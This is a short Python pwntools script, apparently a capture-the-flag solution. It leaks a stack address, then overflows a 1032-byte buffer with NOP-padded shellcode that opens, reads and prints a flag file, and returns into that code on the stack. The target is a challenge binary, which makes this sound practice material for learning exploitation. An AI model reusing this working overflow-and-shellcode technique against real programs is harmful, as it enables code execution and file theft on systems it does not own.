#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+231
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 1032

    io.recvuntil(b"mylib.dll ")
    stack = int(io.recvline().split(b":")[0], 16)
    info("stack: %#x", stack)

    sc = asm(shellcraft.openat(-1, "/home/user/flag.txt"))
    sc += asm(shellcraft.read('rax', 'rsp', 0x50))
    sc += asm(shellcraft.write(1, 'rsp', 0x50))

    payload = sc.ljust(offset, b"\x90") + p64(stack)

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

